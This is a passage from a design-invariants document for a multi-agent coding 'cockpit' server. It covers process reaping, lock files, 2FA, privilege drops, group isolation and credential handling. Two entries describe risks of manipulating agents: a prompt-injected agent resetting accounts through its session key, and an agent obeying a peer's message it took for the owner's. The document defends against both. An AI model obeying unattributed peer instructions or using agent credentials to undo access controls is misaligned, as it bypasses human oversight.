    `esbuild` service left behind, a `gh` that outlived its `bash`.
    The reason this ran for months unseen is that a zombie is almost free: no
    memory, no CPU, no log line, nothing on screen. It costs one pid slot. So
    the only symptom is the end state, and the end state is total: once the
    cgroup's pid budget is spent the container cannot fork AT ALL — no new
    agent, no `git`, no shell, including for whoever is trying to diagnose it.
    Measured on the fleet (2026-10-25, every container, none with `--init`):
    the two-month-old instance held **79,055 zombies of a 113,098 pid budget**
    (70%), a nine-day-old one 39,121 — all with ppid 1, 55% `sleep`, 27%
    `bash`, 13% `esbuild`. An earlier look at the same numbers was recorded as a
    live "process leak" of sleep/bash/esbuild and sent the diagnosis towards
    polling loops that were never terminated; they were already dead. **A pid
    count is not a load measurement** — read the state column before concluding.
    The fix is to not be pid 1: the image enters through `tini`
    (`ENTRYPOINT ["/usr/bin/tini", "--", "docker-entrypoint.sh"]`), which reaps
    orphans as they appear and forwards signals, so the supervisor's exit codes
    — which decide a restart, cf. the SIGTERM path — are unchanged. `docker run
    --init` is the same thing for an image that lacks it. Two operational
    consequences, both learned here: it is decided at **creation**, so a
    `docker restart` empties the table (pid 1 restarts) while the leak starts
    over, and only a recreate ends it; and `src/lock.ts` already carried the
    other half of this fact — it must treat a zombie as dead, "because in a
    container pid 1 is the application rather than an init that reaps" — which
    is a workaround for a cause nobody had removed.
    Reproduced minimally on the same host, three runs of one image: with node
    as pid 1, a single orphaned `sleep` leaves one zombie; with `tini` as pid 1,
    and with `docker run --init`, it leaves none.

<a id="inv-49"></a>

45. **A pid number is not an identity — and in a container it is handed out
    again on every restart.** The single-instance lock wrote the holder's pid
    and nothing else, and `pidAlive` answered the only question it could: is
    *some* process wearing that number. Those two questions come apart exactly
    where it hurts. A container's pid namespace restarts at 1, the supervisor's
    own children take the first dozen slots and the server itself lands around
    15 — so the number the previous run wrote is, next boot, almost certainly
    worn by an unrelated process. Observed in production while restarting a
    container: `another instance is already running from this directory (pid 14)
    — exiting`, where 14 was a node the supervisor had just spawned, and the
    real previous server was long dead.
    The failure is the quiet shape again. That refusal **exits 0** on purpose
    (so a supervisor reads a clean stop and does not crash-loop, cf. the SIGTERM
    path), so the container simply stays down with one line in the log and
    nothing wrong anywhere else: the cockpit is gone, every agent with it, and
    the next person to look finds a stopped container and no cause. It is also
    a coin flip, which is worse than a bug that always fires — a restart that
    works proves nothing about the next one.
    The fix is to record WHO, not just WHICH slot: the lock line is now
    `<pid> <starttime>` (field 22 of `/proc/<pid>/stat`, ticks since boot), and
    a live pid whose start time differs from the lock's is a different process,
    so the lock is stale and reclaimed. A reused pid would have to have been
    born on the same tick as the holder. Three properties are deliberate: the
    line still STARTS with the pid, so a lock written by this version is read
    correctly by an older one; a lock carrying no start time keeps the old
    pid-only verdict (there is nothing to compare, and the next successful
    acquire rewrites it); and where there is no `/proc` at all the pid's answer
    still stands, as it already did for the zombie case.
    This became reachable the moment restarts became routine — invariant 44's
    campaign gives every container a small lock pid on its way out, which is
    precisely the collision-prone range.

<a id="inv-50"></a>

46. **A password alone must never register a passkey — and two-factor is only
    as strong as the weakest door around it.** Three doors were open the day it
    was designed, and each would have made the second factor decoration.
    *Enrollment by password*: if a correct password could register a passkey
    while 2FA is on, a thief with the password enrolls their own phone. So
    registering during sign-in needs an enrollment code minted by a verified
    session (yours, an admin's, or a redeemed invitation). *The bootstrap
    admin*: `SHADOK_GUI_PASSWORD` is in every agent's env and nobody can reset
    it, so under 2FA it has no browser session at all. *The agent's key*:
    `x-shadok-session-key` IS the bootstrap admin, so while 2FA is on every
    account and `/2fa` route goes through `cookieAccount`, which accepts neither
    a session key nor a peer — otherwise an agent (or a prompt injection
    driving one) could reset anyone. Actions that would undo the factor for
    someone (reset, a code for another person, switching on/off) also need a
    FRESH passkey assertion, not a session: a session can be ridden, a
    biometric cannot. Switching it on kills every session issued before (the
    cookie's `mfa` field). And the rest stays true: anything running as the
    machine's user can read the account file — soft isolation, as invariant 26.
    Verified end to end in Chromium with a CDP virtual authenticator.
    **A fourth door was shut from the inside: our own Telegram bridge.** It is
    the one caller that authenticates with a cookie and is not a person — a WS
    to our own server carrying `adminCookie()` — so "no `mfa` flag, no entry"
    plus "the instance password cannot sign in" refused it too: with 2FA on,
    `GET /live` and the WS upgrade both answered 401, the bot kept long-polling
    Telegram, and every message died at the gate with nothing in the log. The
    spec had listed it as unaffected, next to the peers (which really are:
    `x-shadok-peer` is read before the cookie). A browser-shaped rule judges
    every machine that speaks the same credential, so each one needs a named
    principal: the bridge's cookie is minted `mfa=1` and `currentAccount`
    recognises it through `isInternalClient` BEFORE `cookieAccount`, which still
    refuses the bootstrap admin — Telegram works, `/2fa*` stays person-only. The
    flag stays meaningful because minting it needs the signing secret, which no
    login path uses for the instance password and which never reaches an agent's
    env (`SHADOK_AUTH` keeps `mfa=0`, hence refused). Measured both ways on a
    real instance, not reasoned: 401/401 before, 200 + `/2fa` 403 after.

<a id="inv-51"></a>

47. **Never fake a wall.** Isolation between groups is real only when the server
    can provision an OS user AND accounts exist (`deploymentMode` in
    `src/capability.ts`). A mono-tenant instance (npx, a laptop, a Docker run
    without privilege or without a GUI password) therefore REFUSES to create an
    isolated group — explicitly, with the reason (`isolationRefusal`) — and stays
    single-tenant. A "private" group that is only a tab colour reads as protection
    and gives none, which is worse than not offering it. Public groups are no
    wall by design (one commons user), so they stay available everywhere.

<a id="inv-52"></a>

48. **Once migration completes, no agent runs as root — before that, agents keep
    the server's own user, which is root in the stock image.** In a CAPABLE
    (multi-tenant) instance, with the migration marker set and the non-root `main`
    user present, the server drops EVERY spawn to the group's OS user (`dropArgv`
    → `setpriv`, `src/osusers.ts`); the commons drops to `main`
    (`commonsOsUser`, `src/migrate-groups.ts`). The Docker image has no `USER` (the
    server provisions users, so it must start privileged), so the drop is the only
    thing between an agent and root. Until the marker is set — and after a FAILED or
    partial migration, which withholds it — and in every MONO-TENANT instance (no
    privilege or no GUI password), there is no drop user: the spawn is not wrapped
    and the agent runs as the server's own user (root in the stock image). That is
    today's behaviour, never a half-state; the migration banner warns while
    migration is pending or failed. Private and restricted groups are the real
    walls; public/commons shares the one user.

<a id="inv-53"></a>

49. **A caller's group is derived server-side, from the SESSION — never from
    client input — and a resume is checked even for a LIVE session.** Spawn,
    list, drive, secrets, ledger and talk all read the caller's `Viewer` from the
    cookie/session key (`viewerFor`), and a `group` in a frame or body is a
    request to be judged, not a fact. The trap that shipped once: the WS `start`
    handler attached to an already-running session BEFORE authorising, so knowing
    a session id was enough to attach to a private group's live agent. `canResumeAs`
    now runs on the live path too, and the per-turn drive gate `mayDriveSession`
    runs on every prompt/choose/key. The bootstrap admin is NOT exempt (admin
    reach is administrative, not operational); only the server's own loopback
    drivers (`driveChannel`: cron, notifications, reload) pass, by presenting
    `SYSTEM_DRIVE_SECRET` in `x-shadok-system-drive` — a per-boot random that never
    reaches an agent's env.

<a id="inv-54"></a>

50. **`$HOME` must be set at the privilege drop.** `setpriv --reuid` changes the
    uid and nothing else: `HOME`, `USER` and `LOGNAME` stay the SERVER's, so a
    dropped agent runs with `HOME=/root`, cannot read its own `~/.claude`
    (credential, skills, trust state), and every provisioning step still reports
    success. `dropEnv` points them at `homeForUser(user, homeBase)` — the same
    function that created the home — and it applies feature-wide (group users AND
    `main`), not to one group. With NO drop user (mono-tenant, or the commons
    before migration) `dropEnv` returns `{}` and HOME is left untouched, so that
    path is unchanged. Human-verify on a real container: the unit tests
    prove the env, only a real `setpriv` proves the uid can read what it was given.

<a id="inv-55"></a>

51. **Ledger and talk default to the sender's own group; crossing is an explicit,
    consensual act.** A ledger row carries `group` + `scope` and is written
    through the server (`POST /ledger/record`, which stamps the caller's group
    from the session — a skill cannot claim another); it is visible group-wide
    unless recorded `--public`. A letter to another group needs the recipient to
    be public, or a HANDLE the recipient's side shared (`talkVerdict`); a private
    group accepts none. Same gesture as `~/shared/` and `git push`: one deliberate
    outbound move. Reversing a default (public-by-default, remember-to-hide)
    reopens the leak, so it never reverses. Secrets follow it: a group's vault is
    its own, shared into another group BY REFERENCE (`PUT /secrets/share`), and a
    value resolves own → shared-in → Main (`resolveSecretValues`).

<a id="inv-56"></a>

52. **A client that does not say who it is is shown as THE HUMAN — "anonymous"
    is not a state this cockpit has.** `echoAuthor` falls back to `"you"` and
    `isOwnPrompt` to *yours* when a `prompt-echo` carries neither `origin` nor
    `from`, deliberately: a web prompt with no account is the person driving a
    cockpit that has one human. pilotctl declared no `origin`, so every prompt an
    agent sent to another agent landed in that branch — the bubble sat on the
    user's side of the chat, signed "you", for a message they never wrote. Two
    halves, and the invisible one is the worse: the `⟦platform · time · sender⟧`
    context header was gated on `web|telegram|cli`, so the RECEIVING agent got a
    bare user message and obeyed a peer believing it was the cockpit's owner. So:
    **every machine client names itself** (`callerOrigin`, from
    `SHADOK_SESSION_ID` — inside a piloted session "agent", in a human's shell
    "cli"), and the two paths that say who spoke stay in step; add an origin to
    one and you must decide for the other.
    **The name is resolved from the KEY, never from the frame** —
    `agentNameForKey`, the same rule the web already had (`promptAuthor`). The
    trap here is that the obvious fix is wrong in an interesting way:
    `currentAccount` maps `x-shadok-session-key` to the bootstrap admin, which is
    the right answer for AUTHORISATION and would have signed an agent's message
    with the human's name — the same lie, with a signature. For the same reason
    `spawnActor` credits `agent <name>` rather than the account on an
    agent-origin socket. The HIDDEN machine paths are untouched and must stay
    that way: a cron fire and a parent notification carry their own mark, are not
    "someone speaking", and reach the TUI through `driveChannel`
    (`origin: "cron"`), so they match no header gate.
    **And a name is not an address.** Naming the sender only told the receiver
    WHO spoke; nothing makes cockpit tab names unique and every tool takes an
    id, so an agent had no reliable way back. An `agent` header therefore ends
    with the sender's short session id (`⟦agent · … · Shadok-Boss · b1c347bc⟧`),
    which `resolveResumeId` resolves as a prefix — refusing an ambiguous one
    rather than guessing. `parsePromptMeta` splits it back OFF before reading
    `who`, because `who` is what labels a bubble on reload: an address left
    inside the name would be printed in the chat forever after. The split is
    narrow on purpose (agent platform, exact 8 hex, last field) — `who` is
    deliberately "everything past the time" so a sender whose name contains
    " · " survives, and a greedier rule would eat into it.

<a id="inv-57"></a>

53. **`claude setup-token` runs in a tmux session — read the RENDERED screen, not
    a raw stream — and the token it mints never leaves the server.** The sign-in
    (`auth login`) runs on plain pipes, so the obvious move — make the token card
    its twin — is wrong: `setup-token` is `isatty`-gated (measured v2.1.317) and
    prints NOTHING on pipes, so it needs a real terminal. The FIRST cut drove it
    on a node-pty and reverse-engineered the raw OSC-8/CSI stream; that silently
    missed the minted token at the success screen the one time it met a real mint
    (the whole success path had never been exercised — a value matched by SHAPE
    off a reconstructed fixture, never a live keystroke). So `src/setup-token.ts`
    now drives it inside a **detached tmux session** — the same engine as every
    agent (`src/tmux.ts`) — and reads the pane **already rendered**
    (`capture-pane -p`), where the URL and the token are plain text and the whole
    escape-stripping problem is gone. Measured live (v2.1.317, 2026-11-04) driving
    it through tmux exactly as the module does: the URL prints as a bare
    `https://` on its own line; the code box is a **masked** field, so the flow
    waits for the typed code to land before Enter; a bad code renders
    `OAuth error: Invalid code…` + `Press Enter to retry` (the retry needs an
    explicit Enter); and on success the screen reads `✓ Long-lived authentication
    token created successfully!` / `Your OAuth token (valid for 1 year):` / the
    `sk-ant-oat01-…` token (108 chars, full, unmasked) / `Use this token by
    setting: export CLAUDE_CODE_OAUTH_TOKEN=<token>` — that last line's literal
    `<token>` placeholder must NOT be mistaken for the token (the parser matches
    the `sk-ant-oat01-` shape, which the placeholder is not). The second half is
    the whole security surface: unlike `auth login` (which writes the keychain,
    nothing to capture), `setup-token` PRINTS the token on success. It is read off
    the rendered pane and handed to a server-side `store` (`setSecret` into the
    vault) — **never** logged (the module makes no `console.*` call, because the
    captured buffer can hold the token), returned in an HTTP body, echoed to
    Telegram, or placed in the page. `submitSetupTokenCode` resolves only
    `{ok}`/`{error}`; the endpoints (`/mt-token/*`, admin + browser-origin) and
    the Telegram `/mtcode` relay only that. Two spelling traps the tests pin: the
    pane must be **wide** (`PANE_COLS = 400`) or the ~108-char token line-wraps and
    a real newline truncates it; and tmux is **required** — a host without it (the
    guard `tmuxAvailable()`) returns a clear error rather than a silent hang.

<a id="inv-58"></a>

54. **A dropped agent's on-disk STATE must live in its own home, not the server's
    `/root` — pointing `$HOME` there (invariant 50) is only half of it.** The
    server runs as root; `createWorktree` and `selfRepoDir` anchored on
    `os.homedir()` = `/root`, so a privilege-dropped agent's worktree and the
    Tweak self-clone landed under `/root/.shadok-ai`. `/root` is `drwx------`, and
    the migration chowns `~/.shadok-ai` to `main` but CANNOT make `main` traverse
    `/root` — so the files are owned yet unreachable, and every Tweak agent (which
    always runs in a worktree of the self-clone) wedged on Claude Code's
    invalid-settings screen. MEASURED on correctsms 0.17.3. Two halves, both
    load-bearing: **location** — `worktreeDir(stateHome,…)` / `selfRepoDir(stateHome)`
    are parameterised on the **agent state home** (`agentStateHome`: the drop
    user's `/home/<user>` when dropped, else `os.homedir()`; `channelStateHome`
    re-derives it for a dormant channel so prune/list look exactly where the spawn
    wrote), defaulting to `os.homedir()` so mono-tenant is byte-for-byte unchanged;
    and **ownership** — the server creates the checkout as root, so
    `chownAgentStateToDropUser` chowns BOTH the checkout and git's external admin
    dir (`<repo>/.git/worktrees/<name>`, resolved via `rev-parse
    --absolute-git-dir`) to the drop user, or the agent could reach but not write
    it. The chosen cure is "move it into the owner's home" (what the migration
    already does for `~/.claude`), NOT `chmod 711 /root` — which would expose the
    server's world-readable `~/.claude` to every other OS user. Known gap left for
    a follow-up: a PRIVATE `sk-*` group's own worktree recovery (`/recover` lists
    only the commons home). Pure path resolution tested in
    `test/worktree-home.test.ts`; the real chown + traversal is a container fact
    (same discipline as invariant 50). Design:
    `docs/superpowers/specs/2026-11-04-dropped-agent-state-home-design.md`.

<a id="inv-59"></a>

55. **Exactly ONE `Live` per agent — a resume that can't attach must HAND OVER
    the old viewers, not orphan them.** The attach branch only fires when
    `existing && !existing.pilot.hasExited`; otherwise the start handler calls
    `createSession`, whose `sessions.set(id, newLive)` REPLACES the registry
    entry. If the retired `Live` still had viewers (a web tab, a Telegram
    bridge), they were left on the old object: its tail keeps running on the
    same `.jsonl`, so they still saw the agent's ANSWERS and their own prompts,
    but every `broadcast` now targeted the new `Live` — so they missed the OTHER
    interfaces' **prompt echoes**, dialogs, and working/turn-done. The reported
    symptom (correctsms, session 6f3abeff): a message typed in Telegram never
    appeared in the web chat until a reload — "not deaf to everything", which is
    exactly the two-`Live` shape and is why "the server code is correct in
    isolation" (the echo IS broadcast, excluding only the sender). The fix
    (`supersedeSession`, `src/live-handover.ts`): move the retired `Live`'s
    `clients` onto the new one and quiet the old — but the teardown is
    DELIBERATELY not `destroySession`. A `hasExited` can latch on one transient
    `has-session` probe (invariants 23/25) while the pane is alive, so the new
    `Live` may have adopted that very pane: killing the old pilot would kill the
    live agent, and clearing the shared tail position would make the new tail
    replay from byte 0. Two companions make the handover whole: a connection's
    per-socket `session` closure is re-pointed to the current `Live` for its id
    at the top of the message loop (so an orphaned tab's SENDS, and its
    close/detach, act on the one real `Live`), and `ws.on("close")` detaches from
    `sessions.get(id)` rather than the stale closure. Pure handover tested in
    `test/live-handover.test.ts`. Design:
    `docs/superpowers/specs/2026-11-04-one-live-per-agent-design.md`.

<a id="inv-60"></a>

56. **A refreshable login credential is single-owner — share it only within one
    OS user, never across users.** `claude` refreshes its on-disk credential by
    **write-new-then-rename**, leaving it **owned by the refresher, mode 600**,
    and **rotates** the refresh token. So a credential shared between DIFFERENT
    OS users — a per-home symlink, or one file in a shared group — breaks the
    moment any one refreshes: the rename destroys the symlink (private copy) or
    re-owns the file (the others lose read), and a holder of the now-rotated
    refresh token is **wiped** on its next refresh. Measured twice (#373 ledger
    `[2d5c]`; this session's POC `[45be]`, where a copied credential's sibling
    logged itself out). **Same-user** agents share one login natively — one uid,
    one real file — which is exactly why the all-`root` pre-migration setup
    worked. There are two cross-user-safe answers and each costs something: the
    static `setup-token` (`CLAUDE_CODE_OAUTH_TOKEN`, `src/setup-token.ts`) never
    writes to disk and never refreshes, so it is safe across users — but it is
    **model-requests-only**, i.e. **no claude.ai connectors**; a real
    `claude auth login` (`src/agent-login.ts`) carries the connectors but is
    single-owner, so the `login` auth mode logs in **each OS user once into its
    OWN home** (commons `main` + each private group's `sk-*`; ~1 month, per-user
    reconnect), never sharing across users. Sharing one login across users would
    need an **auth broker** — rejected: a credential babysitter races `claude`'s
    rename, and a model-API (`ANTHROPIC_BASE_URL`) proxy does not carry the
    connectors (they are direct remote-MCP connections off the model path). The
    per-instance `config.agentAuth` (`"token"` default | `"login"`) picks which;
    in `login` mode the server injects NO token (it would outrank and suppress
    the login). Design:
    `docs/superpowers/specs/2026-11-04-connectors-via-global-login-design.md`.
